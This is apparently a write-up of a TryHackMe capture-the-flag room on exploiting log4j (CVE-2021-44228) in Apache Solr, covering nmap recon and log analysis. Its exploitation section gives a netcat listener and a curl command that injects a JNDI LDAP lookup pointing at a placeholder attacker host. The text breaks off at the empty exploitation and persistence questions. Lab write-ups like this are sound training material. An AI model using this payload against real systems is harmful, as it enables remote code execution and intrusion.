[Solar, exploiting log4j - TryHackMe](https://tryhackme.com/room/solar) | Cya-nyde
============================================================

Explore CVE-2021-44228, a vulnerability in log4j affecting almost all software under the sun.

## Credits

- Room created by [JohnHammond](https://tryhackme.com/p/JohnHammond) and [tryhackme](https://tryhackme.com/p/tryhackme)
- Room type: Free

## Recon

- Initial recon performed using nmap
- **sV** and **-p-** flags are used to ensure all ports are covered and their service versions listed
- **-T 5** option is added to increase speed at the cost of stealth (since this is a practice room)
- Optionally, add **-v** or **-vv** to increase verbosity

`nmap -sV -p- -T 5 <target ip>`

We get this as output:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp  open  rpcbind 2-4 (RPC #100000)
8983/tcp open  http    Apache Solr
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### What service is running on port 8983? (Just the name of the software)

> **Apache Solr** is running on port 8983

## Discovery

We can visit the service running on port 8983 directly in a web browser

### Take a close look at the first page visible when navigating to http://x.x.x.x:8983. You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the `-Dsolr.log.dir` argument set to, displayed on the front page?

> The following snippet can be seen on the front page of the portal: <code>-Dsolr.log.dir=**/var/solr/logs**</code>

### One file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)

- This room gives us a zip file of task files to use
- Looking through each of them, we can find one that has an abnormal amount of INFO entries

> Upon reading through the **solr.log** file, we can see these INFO entries

### What "path" or URL endpoint is indicated in these repeated entries?

Snippet of log:

```
2021-12-13 03:47:53.989 INFO  (qtp1083962448-21) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:54.819 INFO  (qtp1083962448-16) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:55.284 INFO  (qtp1083962448-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:55.682 INFO  (qtp1083962448-22) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:56.075 INFO  (qtp1083962448-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
```

> The path referenced in these entries is **/admin/cores**

### Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)

> The **params** field with empty brackets indicates that we could affect the input

## Exploitation

- Open a netcat listener using `nc -lvnp <port of your choice>`
- Use curl to exploit target
    - `curl 'http://x.x.x.x:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:PORT\}'`
- This confirms that we are able to exploit the server, but the room gives us a more detailed attack chain

### What is the output of running this command? (You should leave this terminal window open as it will be actively awaiting connections)

## Persistence

### What user are you?

